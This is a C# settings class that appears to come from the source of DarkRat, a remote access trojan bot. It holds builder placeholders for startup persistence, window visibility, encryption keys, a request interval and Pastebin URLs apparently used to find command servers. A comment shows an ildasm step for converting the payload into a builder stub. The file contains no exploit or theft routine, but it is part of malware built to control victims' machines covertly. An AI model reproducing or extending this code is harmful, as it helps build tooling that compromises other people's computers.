using System;

namespace DarkRat.Classes
{
    class Settings
    {
        //ildasm.exe "D:\DarkRat\Bot\LiteHTTP\bin\Debug\Payload.exe" /out="D:\DarkRat\Bot\LiteHTTP\bin\Debug\Stub.il"

        public static string Startup = "%Startup%";
        public static string reqinterval = "%reqinterval%";
        public static string display = "%visibility%";
        public static string edkey = "%edkey%";
        public static string spkey = "%spkey%";
        public static string debug = "%debug%"; 
        public static string reqintervalType = "%reqintervalType%"; 
        public static string botv = "v1.1.1";
        public static string ctask = "0"; // this does not need to be changed
        public static string[] PastebinUrl = Microsoft.VisualBasic.Strings.Split("%URL%", "#,#");
    }
}